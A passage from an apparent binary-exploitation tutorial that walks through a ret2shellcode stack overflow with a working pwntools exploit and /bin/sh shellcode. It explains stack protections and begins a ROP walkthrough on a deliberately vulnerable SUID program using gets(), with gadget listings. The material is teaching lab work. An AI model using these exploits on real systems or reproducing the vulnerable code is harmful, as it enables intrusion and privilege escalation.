</span></span></code></pre></div><p><img src="/img/pwn5.png" alt="pwn5.png"></p>
<p>We can see that stack has been overflowed and address has been put to <code>0x6161616161616166</code> we can copy 8 bytes <code>0x6161616161616166</code> and unhex it which is <code>aaaaaaaf</code> but since its in little-endian format in memory it will be <code>faaaaaaa</code>. We can run this command to get offset. <code>-n</code> specifies size which is 8 bytes.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; cyclic -l faaaaaaa -n <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>Finding cyclic pattern of <span style="color:#ae81ff">8</span> bytes: b<span style="color:#e6db74">&#39;faaaaaaa&#39;</span> <span style="color:#f92672">(</span>hex: 0x6661616161616161<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Found at offset <span style="color:#ae81ff">40</span>
</span></span></code></pre></div><p>We have our offset at 40. It takes exactly 40 bytes of input to reach the return address (RIP) on the stack. So 41st byte onwards we will start overwriting the return address. To confirm it we can do this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; cyclic <span style="color:#ae81ff">40</span>
</span></span><span style="display:flex;"><span>aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaa
</span></span><span style="display:flex;"><span>pwndbg&gt; r
</span></span><span style="display:flex;"><span>Starting program: /home/at0m/ret2shellcode 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Thread debugging using libthread_db enabled<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Using host libthread_db library <span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libthread_db.so.1&#34;</span>.
</span></span><span style="display:flex;"><span>We have just fixed the plumbing systm, let<span style="color:#e6db74">&#39;s hope there&#39;</span>s no leaks!
</span></span><span style="display:flex;"><span>&gt;.&gt; aaaaah shiiit wtf is dat address doin here...  0x7fffc33b24a0
</span></span><span style="display:flex;"><span>aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaaBBBB
</span></span></code></pre></div><p><img src="/img/pwn6.png" alt="pwn6.png"></p>
<p>We can either see from its address which is <code>42</code> which means <code>B</code> or we can just look at <code>RSP</code> and see <code>BBBB</code> there.</p>
<p>We can&rsquo;t have shell code more than 40 bytes. We can this shell code from <a href="https://www.exploit-db.com/exploits/42179">here</a>. Since this shell code is of 24 bytes we will need to add other 16 bytes of junk to fill the space. You can read this shellcode assembly from the link.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">\</span>x50<span style="color:#960050;background-color:#1e0010">\</span>x48<span style="color:#960050;background-color:#1e0010">\</span>x31<span style="color:#960050;background-color:#1e0010">\</span>xd2<span style="color:#960050;background-color:#1e0010">\</span>x48<span style="color:#960050;background-color:#1e0010">\</span>x31<span style="color:#960050;background-color:#1e0010">\</span>xf6<span style="color:#960050;background-color:#1e0010">\</span>x48<span style="color:#960050;background-color:#1e0010">\</span>xbb<span style="color:#960050;background-color:#1e0010">\</span>x2f<span style="color:#960050;background-color:#1e0010">\</span>x62<span style="color:#960050;background-color:#1e0010">\</span>x69<span style="color:#960050;background-color:#1e0010">\</span>x6e<span style="color:#960050;background-color:#1e0010">\</span>x2f<span style="color:#960050;background-color:#1e0010">\</span>x2f<span style="color:#960050;background-color:#1e0010">\</span>x73<span style="color:#960050;background-color:#1e0010">\</span>x68<span style="color:#960050;background-color:#1e0010">\</span>x53<span style="color:#960050;background-color:#1e0010">\</span>x54<span style="color:#960050;background-color:#1e0010">\</span>x5f<span style="color:#960050;background-color:#1e0010">\</span>xb0<span style="color:#960050;background-color:#1e0010">\</span>x3b<span style="color:#960050;background-color:#1e0010">\</span>x0f<span style="color:#960050;background-color:#1e0010">\</span>x05
</span></span></code></pre></div><p>Exploit in Python.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Load the ELF binary</span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./ret2shellcode&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Start the local process</span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Wait for the leaked stack address (assuming program prints it like: &#34;... 0x7fffd...&#34;)</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;... &#39;</span>)
</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> int(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">14</span>), <span style="color:#ae81ff">16</span>)  <span style="color:#75715e"># Read 14-byte hex string and convert to integer</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Classic 24-byte /bin/sh shellcode for execve syscall</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Construct the payload:</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># [ shellcode ][ padding to reach RIP ][ leaked address (return to shellcode) ]</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> shellcode <span style="color:#f92672">+</span> cyclic(<span style="color:#ae81ff">16</span>) <span style="color:#f92672">+</span> pack(leak)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Send the payload to the program</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Open interactive session to use the shell if exploit is successful</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="stack-overflow-protections">Stack Overflow Protections</h2>
<h3 id="stack-canary">Stack Canary</h3>
<p>A <strong>stack canary</strong> is a security mechanism used to detect and prevent stack buffer overflow attacks. It works by placing a small, known value called the &ldquo;canary&rdquo; just before the return address on the stack. When a function returns, the program checks if the canary value has been altered. If an overflow overwrites the return address, it will also modify the canary, triggering a detection. This causes the program to terminate immediately or take protective action, preventing the attacker from hijacking control flow. Stack canaries add an important layer of defense by making it much harder for attackers to exploit buffer overflows silently. However, if the canary value is leaked or bypassed, the protection can be defeated, so it is often combined with other security features like ASLR and NX.</p>
<h3 id="no-executenx-or-data-execution-policy-dep">No-eXecute(NX) or Data Execution Policy (DEP)</h3>
<p><strong>NX (No-eXecute)</strong>, also known as <strong>DEP (Data Execution Prevention)</strong>, is a CPU and operating system feature that prevents certain areas of memory from being executed as code. In a typical program, sections like the <strong>stack</strong> or <strong>heap</strong> are meant for storing data not for running instructions. NX marks these memory regions as <strong>non-executable</strong>, so even if an attacker injects malicious code (like shellcode) into the stack, the CPU will refuse to run it and trigger a crash or exception instead. This significantly raises the bar for exploiting buffer overflows because simply injecting code into memory is no longer enough the attacker would need to find or reuse existing executable code (like with <strong>ROP</strong>, Return-Oriented Programming). NX/DEP is widely used in modern systems to block basic code injection attacks and is a key part of modern exploit mitigation. Its limited because it only blocks Return2Shellcode.</p>
<h3 id="address-space-layout-randomization-aslr">Address Space Layout Randomization (ASLR)</h3>
<p><strong>ASLR (Address Space Layout Randomization)</strong> is a security technique used to randomize the memory addresses used by a program each time it runs. This includes the locations of the stack, heap, shared libraries (like libc), and sometimes even the binary itself. The idea is to make it <strong>unpredictable</strong> where key parts of the program will be loaded in memory. This makes exploitation much harder, because even if an attacker knows there&rsquo;s a vulnerability, they can&rsquo;t rely on hardcoded addresses like where shellcode is stored or where system functions are located. Instead, they must first <strong>leak a valid memory address</strong> or bypass ASLR in some way. Without ASLR, memory addresses remain constant across runs, making return-to-libc or ret2shellcode-style attacks much easier. Combined with other defenses like NX and stack canaries, ASLR significantly reduces the reliability of many classic exploitation techniques. It is constant throughout the system it means that you can&rsquo;t on or off ASLR in only one program you have to do it with whole system.</p>
<p>To Check current ASLR status in Linux:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ cat /proc/sys/kernel/randomize_va_space
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>
</span></span></code></pre></div><ul>
<li><strong>0</strong> ‚Äì ASLR <strong>disabled</strong> (no randomization)</li>
<li><strong>1</strong> ‚Äì Partial randomization (stack, mmap, etc.)</li>
<li><strong>2</strong> ‚Äì Full randomization (includes heap, stack, libraries, etc.)</li>
</ul>
<h3 id="position-independent-executable-pie">Position Independent Executable (PIE)</h3>
<p><strong>PIE (Position Independent Executable)</strong> is a binary format in which the code is compiled to be location-independent, meaning it can be loaded at any memory address during runtime. This is crucial for enabling full Address Space Layout Randomization (ASLR), a security technique that randomizes memory addresses to make exploitation harder. When PIE is enabled, the entire binary, including its functions and variables, is loaded at a random location each time the program runs. This unpredictability significantly increases the difficulty of attacks such as return-to-text (ret2text) or return-oriented programming (ROP), because the attacker cannot reliably guess the location of executable code. Without PIE, the code is always loaded at the same fixed address, even if ASLR is enabled for other segments like the stack or heap. Therefore, PIE is often combined with ASLR to provide a stronger security posture against memory corruption vulnerabilities.</p>
<p>To compile with PIE:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -fPIE -pie -o mybinary mysource.c
</span></span></code></pre></div><p>To compile without PIE:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -no-pie -o mybinary mysource.c
</span></span></code></pre></div><h3 id="relocation-read-only-relro">Relocation Read-Only (RELRO)</h3>
<p><strong>RELRO (Relocation Read-Only)</strong> is a security feature in ELF binaries that makes certain sections of the binary read-only after program startup, specifically the <strong>Global Offset Table (GOT)</strong>.</p>
<p>The <strong>GOT (Global Offset Table)</strong> is a crucial structure used in ELF (Executable and Linkable Format) binaries for dynamic linking, especially when the binary uses shared libraries. When a program makes a call to a function in a shared library (like <code>printf</code>, <code>read</code>, etc.), the actual memory address of that function is not known at compile time it‚Äôs resolved at runtime. The GOT holds these function addresses.</p>
<p>This helps prevent <strong>GOT overwrite attacks</strong>, which are commonly used in exploits like GOT hijacking. There are two types of RELRO: <strong>Partial RELRO</strong> and <strong>Full RELRO</strong>. Partial RELRO sets the GOT as read-only during runtime but does not prevent overwriting its entries during execution. Full RELRO, on the other hand, makes the GOT completely read-only by resolving all symbols at program startup, which makes GOT overwrites impossible. While Full RELRO adds a small performance overhead due to early symbol resolution, it significantly strengthens the binary‚Äôs resistance to certain types of memory corruption attacks.</p>
<p>To check protection in Linux you can use <code>checksec</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ checksec --file<span style="color:#f92672">=</span>&lt;FILE-NAME&gt;
</span></span></code></pre></div><h2 id="0x5---return-oriented-programming-rop">0x5 - Return Oriented Programming (ROP)</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> bin_sh[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">callme</span>() {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> str[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ls -la&#34;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">system</span>(str);	
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">init</span>() {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">gid_t</span> gid;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uid_t</span> uid;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  gid <span style="color:#f92672">=</span> <span style="color:#a6e22e">getegid</span>();
</span></span><span style="display:flex;"><span>  uid <span style="color:#f92672">=</span> <span style="color:#a6e22e">geteuid</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setresgid</span>(gid, gid, gid);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setresuid</span>(uid, uid, uid);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">init</span>();
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> buff[<span style="color:#ae81ff">30</span>];
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Enter Data - &#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">gets</span>(buff);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>gcc rop.c -o rop -no-pie -fno-stack-protector</code></p>
<p>ROP is technique to bypass NX protection.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ls -la rop
</span></span><span style="display:flex;"><span>-rwsrwxrwx <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">17040</span> Jun <span style="color:#ae81ff">26</span> 17:03 rop
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ checksec --file<span style="color:#f92672">=</span>rop --format<span style="color:#f92672">=</span>json
</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span> <span style="color:#e6db74">&#34;rop&#34;</span>: <span style="color:#f92672">{</span> <span style="color:#e6db74">&#34;relro&#34;</span>:<span style="color:#e6db74">&#34;partial&#34;</span>,<span style="color:#e6db74">&#34;canary&#34;</span>:<span style="color:#e6db74">&#34;no&#34;</span>,<span style="color:#e6db74">&#34;nx&#34;</span>:<span style="color:#e6db74">&#34;yes&#34;</span>,<span style="color:#e6db74">&#34;pie&#34;</span>:<span style="color:#e6db74">&#34;no&#34;</span>,<span style="color:#e6db74">&#34;rpath&#34;</span>:<span style="color:#e6db74">&#34;no&#34;</span>,<span style="color:#e6db74">&#34;runpath&#34;</span>:<span style="color:#e6db74">&#34;no&#34;</span>,<span style="color:#e6db74">&#34;symbols&#34;</span>:<span style="color:#e6db74">&#34;yes&#34;</span>,<span style="color:#e6db74">&#34;fortify_source&#34;</span>:<span style="color:#e6db74">&#34;no&#34;</span>,<span style="color:#e6db74">&#34;fortified&#34;</span>:<span style="color:#e6db74">&#34;0&#34;</span>,<span style="color:#e6db74">&#34;fortify-able&#34;</span>:<span style="color:#e6db74">&#34;2&#34;</span> <span style="color:#f92672">}</span> 
</span></span></code></pre></div><p>We can see <code>NX</code> is enabled. It means we can&rsquo;t run <code>Ret2Shellcode</code> technique.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ./rop
</span></span><span style="display:flex;"><span>Enter Data - AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>    <span style="color:#ae81ff">11150</span> segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>  ./rop
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> info functions
</span></span><span style="display:flex;"><span>All defined functions:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Non-debugging symbols:
</span></span><span style="display:flex;"><span>0x0000000000401000  _init
</span></span><span style="display:flex;"><span>0x00000000004010a0  setresuid@plt
</span></span><span style="display:flex;"><span>0x00000000004010b0  setresgid@plt
</span></span><span style="display:flex;"><span>0x00000000004010c0  system@plt
</span></span><span style="display:flex;"><span>0x00000000004010d0  printf@plt
</span></span><span style="display:flex;"><span>0x00000000004010e0  geteuid@plt
</span></span><span style="display:flex;"><span>0x00000000004010f0  gets@plt
</span></span><span style="display:flex;"><span>0x0000000000401100  getegid@plt
</span></span><span style="display:flex;"><span>0x0000000000401110  _start
</span></span><span style="display:flex;"><span>0x0000000000401140  _dl_relocate_static_pie
</span></span><span style="display:flex;"><span>0x0000000000401150  deregister_tm_clones
</span></span><span style="display:flex;"><span>0x0000000000401180  register_tm_clones
</span></span><span style="display:flex;"><span>0x00000000004011c0  __do_global_dtors_aux
</span></span><span style="display:flex;"><span>0x00000000004011f0  frame_dummy
</span></span><span style="display:flex;"><span>0x00000000004011f6  callme
</span></span><span style="display:flex;"><span>0x0000000000401222  init
</span></span><span style="display:flex;"><span>0x000000000040126f  main
</span></span><span style="display:flex;"><span>0x00000000004012b0  __libc_csu_init
</span></span><span style="display:flex;"><span>0x0000000000401320  __libc_csu_fini
</span></span><span style="display:flex;"><span>0x0000000000401328  _fini
</span></span></code></pre></div><p>There are only three user-defined functions: <code>callme</code>, <code>init</code>. <code>main</code>. Init function is used to initialize If we manage to get a shell through exploiting this binary, because of this initialization, your shell would inherit the root UID (if the binary is SUID-root), granting you root privileges on the system. So only important functions are <code>main</code> and <code>callme</code>.</p>
<p><img src="/img/pwn7.png" alt="pwn7.png"></p>
<p>We can see main function calls <code>gets</code> that&rsquo;s why its vulnerable to stack overflow because it doesn&rsquo;t perform any bound checking on input it reads.</p>
<p><img src="/img/pwn8.png" alt="pwn8.png"></p>
<p>Upon disassembling <code>callme</code> function we can see callme function is not being called anywhere in program so we need to manually call it. <code>callme</code> function is calling <code>system</code> function (<code>system@plt</code>). So first lets check whats inside that system function but for it we have to first call the <code>callme</code> function manually. First lets copy the starting address of <code>callme</code> function which is <code>0x00000000004011f6</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; break main
</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">1</span> at 0x401277
</span></span></code></pre></div><p>After this we need to run the program before setting <code>rip</code> to <code>callme</code> function address so run it once using <code>r</code> or <code>run</code> command. Now we can set our <code>rip</code>. RIP or Register Instruction Pointer holds the memory address of next instruction that CPU will execute.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; set $rip<span style="color:#f92672">=</span>0x00000000004011f6
</span></span></code></pre></div><p>After setting <code>rip</code> to <code>callme</code> function address we can run command <code>ni</code> to go to <strong>next instruction</strong> which in our case will be <code>callme</code> function.</p>
<p><img src="/img/pwn9.png" alt="pwn9.png">
We can  see that we are currently in <code>callme</code> function. Look at that small pointer at left this shows which instruction we are currently in. As we can see the function <code>system@plt</code> which we want to examine is at <code>0x40121a &lt;callme+36&gt;</code> we can run <code>ni</code> command until that small pointer which is <code>rip</code> points to that address we want.</p>
<p><img src="/img/pwn10.png" alt="pwn10.png"></p>
<p>After running <code>ni</code> command 5-6 times pointer finally went to the address we want. The string <code>ls -la</code> we are seeing in the disassembly of the <code>callme</code> function is the command that is being passed to the <code>system()</code> function call. In our binary, there&rsquo;s a function called <code>callme</code> that looks like this (simplified):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">callme</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;ls -la&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We thought it would have something like <code>/bin/sh</code> so that we could get our shell but looks like its not the case. <code>ls -la</code> is the argument that is stored in <code>RDI</code> register.</p>
<p><img src="/img/pwn11.png" alt="pwn11.png"></p>
<p>This is where we can use <strong>Return Oriented Programming</strong> technique. In ROP, instead of injecting our own code (which is often blocked by modern protections like <strong>NX</strong>), we reuse small sequences of existing instructions already present in the program&rsquo;s memory. These small instruction sequences are called <strong>gadgets</strong>.</p>
<p>First, we need to overflow the return address on the stack so that when the function returns, it jumps to a location we control.</p>
<p>Next, we want to find gadgets in the program that allow us to change the value of the <code>RDI</code> register (which is the first argument to functions on x86-64 Linux).</p>
<p>Currently, <code>callme</code> sets <code>RDI</code> to point to the string <code>&quot;ls -la&quot;</code> before calling <code>system()</code>. Instead, we want to set <code>RDI</code> to point to the string <code>&quot;/bin/sh&quot;</code> so that when <code>system()</code> is called, it spawns a shell.</p>
<p>Finally, we chain these gadgets to first set up <code>RDI</code> with the address of <code>&quot;/bin/sh&quot;</code>, and then jump to <code>system@plt</code> to execute the shell.</p>
<p>For this to write exploit we can install a very handy library called <code>ROPgadgets</code> in Python.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ pip install ROPgadget
</span></span></code></pre></div><p>Okay, lets do first part of overflowing. We already know how to do it from previous topics. We got our offset at <code>40</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./rop&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> cyclic(<span style="color:#ae81ff">40</span>) <span style="color:#f92672">+</span> pack()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>senldine(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>Currently address of <code>pack()</code> is empty since we don&rsquo;t know the address where we can change value of <code>RDI</code>. This is where <code>ROPgadgets</code> comes in handy.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ROPgadget --binary rop
</span></span><span style="display:flex;"><span>Gadgets information
</span></span><span style="display:flex;"><span><span style="color:#f92672">============================================================</span>
</span></span><span style="display:flex;"><span>0x000000000040113d : add ah, dh ; nop ; endbr64 ; ret
</span></span><span style="display:flex;"><span>0x000000000040116b : add bh, bh ; loopne 0x4011d5 ; nop ; ret
</span></span><span style="display:flex;"><span>0x000000000040131c : add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al ; add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al ; endbr64 ; ret
</span></span><span style="display:flex;"><span>0x00000000004012a8 : add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al ; add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al ; leave ; ret
</span></span><span style="display:flex;"><span>0x00000000004012a9 : add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al ; add cl, cl ; ret
</span></span><span style="display:flex;"><span>0x0000000000401036 : add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al ; add dl, dh ; jmp 0x401020
</span></span><span style="display:flex;"><span>0x00000000004011da : add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al ; add dword ptr <span style="color:#f92672">[</span>rbp - 0x3d<span style="color:#f92672">]</span>, ebx ; nop ; ret
</span></span><span style="display:flex;"><span>0x000000000040131e : add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al ; endbr64 ; ret
</span></span><span style="display:flex;"><span>0x000000000040113c : add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al ; hlt ; nop ; endbr64 ; ret
</span></span><span style="display:flex;"><span>0x00000000004012aa : add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al ; leave ; ret
</span></span><span style="display:flex;"><span>0x000000000040100d : add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al ; test rax, rax ; je 0x401016 ; call rax
</span></span><span style="display:flex;"><span>0x00000000004011db : add byte ptr <span style="color:#f92672">[</span>rcx<span style="color:#f92672">]</span>, al ; pop rbp ; ret
</span></span><span style="display:flex;"><span>0x00000000004011d9 : add byte ptr cs:<span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al ; add dword ptr <span style="color:#f92672">[</span>rbp - 0x3d<span style="color:#f92672">]</span>, ebx ; nop ; ret
</span></span><span style="display:flex;"><span>0x000000000040113b : add byte ptr cs:<span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al ; hlt ; nop ; endbr64 ; ret
</span></span><span style="display:flex;"><span>0x00000000004012ab : add cl, cl ; ret
</span></span><span style="display:flex;"><span>0x000000000040116a : add dil, dil ; loopne 0x4011d5 ; nop ; ret
</span></span><span style="display:flex;"><span>0x0000000000401038 : add dl, dh ; jmp 0x401020
</span></span><span style="display:flex;"><span>0x00000000004011dc : add dword ptr <span style="color:#f92672">[</span>rbp - 0x3d<span style="color:#f92672">]</span>, ebx ; nop ; ret
</span></span><span style="display:flex;"><span>0x00000000004011d7 : add eax, 0x2e8c ; add dword ptr <span style="color:#f92672">[</span>rbp - 0x3d<span style="color:#f92672">]</span>, ebx ; nop ; ret
</span></span><span style="display:flex;"><span>0x0000000000401085 : add eax, 0xf2000000 ; jmp 0x401020
</span></span><span style="display:flex;"><span>0x0000000000401017 : add esp, <span style="color:#ae81ff">8</span> ; ret
</span></span><span style="display:flex;"><span>0x0000000000401016 : add rsp, <span style="color:#ae81ff">8</span> ; ret
</span></span><span style="display:flex;"><span>0x000000000040121e : call qword ptr <span style="color:#f92672">[</span>rax + 0xff3c3c9<span style="color:#f92672">]</span>
